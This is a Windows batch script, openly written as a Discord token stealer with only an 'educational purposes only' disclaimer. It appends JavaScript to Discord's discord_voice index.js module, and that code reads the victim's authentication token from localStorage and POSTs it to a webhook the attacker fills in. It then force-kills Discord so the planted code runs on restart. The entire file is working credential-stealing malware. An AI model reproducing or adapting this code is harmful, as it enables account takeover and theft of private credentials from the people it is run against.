@echo off
:: i dont take any responsibility for damage done with the programm it's for educational purposes only
set webhook=YOUR WEBHOOK

::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
set /a killdc = 1


set /a app = 0 
set /a voice = 0
if exist %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js
:a
if exist %userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js goto b
set /a app=%app%+1
if %app% == 10 goto c
goto a
:c
set /a app=0 
set /a voice=%voice%+1 
goto a
:b 
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js
if %killdc% == 1 goto d
goto e
:d
::coded by baum#2873
taskkill /im discord.exe /f
:e
